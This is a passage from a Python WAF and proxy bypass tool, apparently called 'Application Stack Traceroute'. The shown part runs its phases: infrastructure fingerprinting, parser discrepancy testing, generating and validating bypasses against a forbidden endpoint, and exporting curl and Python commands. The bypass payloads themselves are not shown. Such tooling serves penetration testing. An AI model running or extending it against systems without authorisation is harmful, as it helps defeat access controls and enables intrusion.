        for discrepancy in self.chain_map['discrepancies']:
            disc_type = discrepancy['type']
            if disc_type not in discrepancy_types:
                discrepancy_types[disc_type] = []
            discrepancy_types[disc_type].append(discrepancy)
        
        for disc_type, discrepancies in discrepancy_types.items():
            report += f"\n{disc_type} ({len(discrepancies)} found):\n"
            for disc in discrepancies[:3]:  # Show first 3 of each type
                if 'description' in disc:
                    report += f"  - {disc.get('description', 'N/A')}\n"
                if 'subtype' in disc:
                    report += f"    Subtype: {disc['subtype']}\n"
        
        report += f"""
🎯 GENERATED BYPASSES: {len(self.chain_map['bypasses'])}
"""
        
        validated_bypasses = [b for b in self.chain_map['bypasses'] if b.get('validated', False)]
        
        for bypass in self.chain_map['bypasses']:
            status = "✅ VALIDATED" if bypass.get('validated', False) else "❌ FAILED"
            report += f"\n{status} {bypass['type']}\n"
            report += f"   Target: {bypass['target']}\n"
            report += f"   Description: {bypass['description']}\n"
        
        report += f"""
📊 SUMMARY:
- Total Layers Identified: {len(self.chain_map['layers'])}
- Discrepancies Found: {len(self.chain_map['discrepancies'])}
- Generated Bypasses: {len(self.chain_map['bypasses'])}
- Validated Bypasses: {len(validated_bypasses)}

🔬 RESEARCH VALUE:
This analysis provides insights into the complete request processing chain
and identifies potential bypass opportunities based on parsing discrepancies
between different infrastructure layers.

Advanced techniques tested include:
- Parser state machine desynchronization
- Buffer boundary exploitation
- Multi-layer encoding confusion
- Protocol tunneling attacks
- Cache poisoning vectors
- ML WAF evasion methods
- Container orchestration bypasses

========================================
"""
        
        return report

    async def run_full_analysis(self):
        """Run the complete application traceroute analysis"""
        print("🚀 Starting Application Stack Traceroute Analysis")
        print("=" * 60)
        
        # Phase 0: Find forbidden endpoint
        self.find_forbidden_endpoint()

        # Phase 1: Protocol Discovery
        await self.protocol_discovery()
        
        # Phase 2: Infrastructure Fingerprinting
        self.infrastructure_fingerprinting()
        service_map = self.service_discovery.discover_backend_chain(self.target_url)
    
        for service_endpoint in self.service_discovery.discovered_services:
            # Service mesh detection
            mesh_info = self.mesh_detector.detect_mesh(
                self.session.headers,
                self.service_discovery.service_tree[service_endpoint]
            )
            
            if mesh_info['type']:
                self.log_discovery("Service Mesh", mesh_info['type'], json.dumps(mesh_info['metadata']))
            
            # Request tracking
            request_id = str(uuid.uuid4())
            transformation = self.request_tracker.track_request(
                request_id,
                service_endpoint,
                {'headers': self.session.headers}
            )
            
            # Analyze payload mutations if present
            if transformation['payload']:
                mutations = self.payload_analyzer.analyze_mutations(
                    self.chain_map.get('original_payload', {}),
                    transformation['payload']
                )
                if mutations['type']:
                    self.log_discovery("Payload Mutation", 
                                     f"Types: {', '.join(mutations['type'])}",
                                     f"Severity: {mutations['severity']}")
            
            # Stack-specific processing
            stack_type = self._detect_stack_type(service_endpoint)
            if stack_type:
                processed_request = self.stack_handler.handle_request(
                    stack_type,
                    {'headers': self.session.headers}
                )
                if processed_request != {'headers': self.session.headers}:
                    self.log_discovery("Stack Processing",
                                     stack_type,
                                     "Request modified for stack compatibility")
        
        # Phase 3: Parser Discrepancy Testing (Enhanced)
        self.parser_discrepancy_testing()
        
        # Phase 4: Custom Bypass Generation
        self.generate_custom_bypasses()
        
        # Phase 5: Bypass Validation
        self.test_generated_bypasses()
        
        # Export bypasses to JSON
        json_file = self.export_bypasses_json()
        
        print("\n" + "=" * 60)
        print("📊 ANALYSIS COMPLETE")
        print("=" * 60)
        # Generate command formats for discovered bypasses
        for bypass in self.chain_map['bypasses']:
            self.command_generator = CommandGenerator({
                'url': self.target_url,
                'headers': bypass.get('headers', {}),
                'payload': bypass.get('payload', {})
            })
            bypass['curl_command'] = self.command_generator.generate_curl()
            bypass['python_code'] = self.command_generator.generate_python()
        return self.generate_report()


def main():
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='Application Stack Traceroute - WAF/Proxy/Backend Chain Analysis')
    parser.add_argument('target', help='Target URL to analyze')
    parser.add_argument('--forbidden-endpoint', help='Known 403/401 endpoint for bypass testing (e.g. https://target.com/admin)')
    parser.add_argument('--skip-forbidden-tests', action='store_true', help='Skip tests requiring forbidden endpoint')
    
    args = parser.parse_args()
    print("\n")
    print("🔬 APPLICATION STACK TRACEROUTE - ENHANCED VERSION 2.5.c")
    print("🎯 Next-Generation Infrastructure Analysis with Advanced Bypass Techniques")
    print("=" * 70)
    
    async def run_analysis():
        tracer = ApplicationTraceroute(
            args.target,
            forbidden_endpoint=args.forbidden_endpoint,
            skip_forbidden_tests=args.skip_forbidden_tests
        )
        report = await tracer.run_full_analysis()
        
        print(report)
        
        # Save report
        report_filename = f"app_traceroute_{int(time.time())}.txt"
        with open(report_filename, 'w') as f:
            f.write(report)
        print(f"\n📄 Full report saved to: {report_filename}")
        
        return tracer.chain_map
    
    # Run the analysis
    results = asyncio.run(run_analysis())
    
    print(f"\n🎉 Analysis complete!")
    print(f"📊 Results: {len(results['discrepancies'])} discrepancies, {len(results['bypasses'])} bypasses generated")
    print(f"💾 Check the JSON file for bypass payloads ready for curl testing!")


if __name__ == "__main__":
    main()